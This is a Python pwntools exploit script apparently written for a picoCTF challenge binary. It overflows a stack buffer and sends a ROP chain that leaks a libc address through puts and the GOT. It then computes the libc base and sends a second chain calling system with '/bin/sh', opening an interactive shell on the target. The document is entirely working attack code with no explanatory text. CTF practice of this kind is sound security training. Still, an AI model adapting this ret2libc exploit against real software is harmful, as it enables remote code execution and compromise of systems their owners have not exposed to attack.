#!/usr/bin/python3

from pwn import *
import sys

BIN = './V'

l = ELF('./libc.so.6')

if len(sys.argv) > 1:
    r = remote('mercury.picoctf.net', 24159)
else:
    r = process(BIN, env={"LD_PRELOAD": "./libc.so.6"})

off = 0x88
r.sendafter('!\n', '\n')
stack = u64(r.recvline()[:-1] + b'\x00\x00')

info(f"""
stack = {hex(stack)}
""")

puts_in_main = 0x400891
pop_rdi_ret = 0x400913
puts_got = 0x601018
ret = 0x40052e

p = off*b'A' + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_in_main)

input()
r.sendline(p)
r.recvline()
libc = r.recvline()[:-1]
libc = u64(libc + b'\x00'*2) - 0x80a30
l.address = libc
system = l.sym['system']
binsh = libc + 0x1b40fa

info(f"""
libc = {hex(libc)}
""")

p = off*b'A' + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
r.sendline(p)

r.interactive()
